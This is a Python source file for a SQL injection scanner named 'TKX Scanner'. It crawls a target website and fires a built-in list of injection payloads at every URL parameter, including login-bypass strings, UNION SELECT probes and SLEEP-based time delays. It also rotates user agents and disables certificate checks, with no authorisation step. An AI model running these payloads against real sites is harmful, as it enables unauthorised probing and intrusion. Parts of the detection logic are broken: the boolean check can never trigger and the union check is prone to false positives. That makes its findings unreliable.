#!/usr/bin/env python3
"""
TKX Scanner - Synchronous SQL Injection Scanner
by KHara Xyra Taiz
"""
import requests
import time
import random
import re
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode
from typing import List, Dict, Optional, Set

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TKXScanner:
    """Simple synchronous SQL injection scanner"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.verify = False
        self.results = []
        self.found_signatures: Set[str] = set()  # Untuk deduplication
        
    def _get_random_headers(self) -> Dict:
        """Generate random headers"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'TKX-Scanner/1.0'
        ]
        
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
    
    def scan_url(self, url: str, max_payloads: int = 15) -> List[Dict]:
        """Scan single URL for SQL injection"""
        vulnerabilities = []
        
        # Parse URL to get parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return vulnerabilities
        
        print(f"[*] Scanning URL: {url}")
        print(f"[*] Parameters found: {', '.join(params.keys())}")
        
        # Test each parameter
        for param in params.keys():
            print(f"  [-] Testing parameter: {param}")
            
            # Load payloads
            payloads = self._load_payloads()
            tested = 0
            found = 0
            
            for payload in payloads[:max_payloads]:  # Limit payloads
                try:
                    tested += 1
                    
                    # Create test URL
                    test_params = params.copy()
                    test_params[param] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    # Send request
                    headers = self._get_random_headers()
                    start_time = time.time()
                    
                    response = self.session.get(
                        test_url,
                        params=test_params,
                        headers=headers,
                        timeout=10,
                        verify=False
                    )
                    
                    response_time = time.time() - start_time
                    
                    # Check for vulnerabilities
                    vuln = self._analyze_response(
                        response.text,
                        response_time,
                        payload,
                        response.status_code
                    )
                    
                    if vuln:
                        found += 1
                        vuln['url'] = url
                        vuln['parameter'] = param
                        vuln['payload'] = payload
                        vuln['status'] = response.status_code
                        vuln['response_time'] = f"{response_time:.2f}s"
                        vulnerabilities.append(vuln)
                        
                        # Print immediate finding
                        print(f"    [!] {vuln['technique']}: {payload[:30]}...")
                        
                except Exception as e:
                    continue
            
            print(f"  [*] Parameter {param}: Tested {tested} payloads, found {found} vulnerabilities")
        
        return vulnerabilities
    
    def _load_payloads(self) -> List[str]:
        """Load SQL injection payloads"""
        # Basic payload set
        payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "'; SELECT SLEEP(5)--",
            "' OR 'a'='a",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin'#",
            "admin'/*",
            "' OR '1'='1'--",
            "' OR '1'='1'#",
            "' OR '1'='1'/*",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "' GROUP BY columnnames having 1=1--",
            "-1' UNION SELECT 1,2,3--",
            "' AND 1=CONVERT(int,@@version)--",
            "' OR IF(1=1,SLEEP(5),0)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ]
        
        return payloads
    
    def _analyze_response(self, response_text: str, response_time: float,
                         payload: str, status_code: int) -> Optional[Dict]:
        """Analyze response for SQL injection indicators"""
        
        response_lower = response_text.lower()
        
        # Create vulnerability signature untuk deduplication
        vuln_signature = f"{payload[:20]}:{response_time:.1f}:{status_code}"
        
        # Check for SQL errors
        sql_errors = [
            ('sql syntax', 'SQL syntax error'),
            ('mysql', 'MySQL error'),
            ('postgresql', 'PostgreSQL error'),
            ('oracle', 'Oracle error'),
            ('sql server', 'SQL Server error'),
            ('syntax error', 'Syntax error'),
            ('unclosed quotation', 'Unclosed quotation'),
            ('warning:', 'PHP warning'),
            ('error in your sql', 'SQL error message'),
            ('you have an error', 'SQL error')
        ]
        
        for error_pattern, error_name in sql_errors:
            if error_pattern in response_lower:
                signature = f"error:{error_pattern}:{vuln_signature}"
                if signature not in self.found_signatures:
                    self.found_signatures.add(signature)
                    return {
                        'technique': 'error-based',
                        'confidence': 90,
                        'evidence': error_name,
                        'signature': signature
                    }
        
        # Time-based detection
        if response_time > 5 and any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark']):
            signature = f"time:{response_time:.1f}:{vuln_signature}"
            if signature not in self.found_signatures:
                self.found_signatures.add(signature)
                return {
                    'technique': 'time-based',
                    'confidence': 85,
                    'evidence': f"Response delayed {response_time:.2f}s",
                    'signature': signature
                }
        
        # Boolean-based (simplified)
        if "' AND 1=1--" in payload and "' AND 1=2--" in payload:
            # In real scanner, would compare responses
            pass
        
        # Union-based detection
        if 'union' in payload.lower() and ('null' in response_lower or 'concat' in response_lower):
            signature = f"union:{vuln_signature}"
            if signature not in self.found_signatures:
                self.found_signatures.add(signature)
                return {
                    'technique': 'union-based',
                    'confidence': 80,
                    'evidence': 'Union query response detected',
                    'signature': signature
                }
        
        return None
    
    def crawl_for_links(self, base_url: str, max_pages: int = 20) -> List[str]:
        """Simple crawler to find links"""
        found_urls = []
        
        try:
            response = self.session.get(base_url, timeout=10, verify=False)
            
            # Simple regex to find URLs
            url_patterns = [
                r'href="([^"]+)"',
                r'src="([^"]+)"',
                r'action="([^"]+)"'
            ]
            
            for pattern in url_patterns:
                for match in re.finditer(pattern, response.text):
                    url = match.group(1)
                    if url.startswith('http'):
                        found_urls.append(url)
                    elif url.startswith('/'):
                        parsed = urlparse(base_url)
                        full_url = f"{parsed.scheme}://{parsed.netloc}{url}"
                        found_urls.append(full_url)
            
        except Exception as e:
            print(f"[!] Crawling error: {e}")
        
        return list(set(found_urls))[:max_pages]
    
    def full_scan(self, crawl: bool = True, max_payloads: int = 15) -> List[Dict]:
        """Perform full scan on target"""
        print(f"[*] Starting TKX scan on: {self.target_url}")
        print(f"[*] Max payloads per parameter: {max_payloads}")
        
        urls_to_scan = [self.target_url]
        
        if crawl:
            print("[*] Crawling for additional URLs...")
            crawled_urls = self.crawl_for_links(self.target_url)
            urls_to_scan.extend(crawled_urls)
            print(f"[*] Found {len(crawled_urls)} additional URLs")
        
        all_vulnerabilities = []
        
        for url in urls_to_scan:
            vulns = self.scan_url(url, max_payloads)
            all_vulnerabilities.extend(vulns)
            
            if vulns:
                print(f"[+] URL {url}: Found {len(vulns)} vulnerabilities")
        
        return all_vulnerabilities
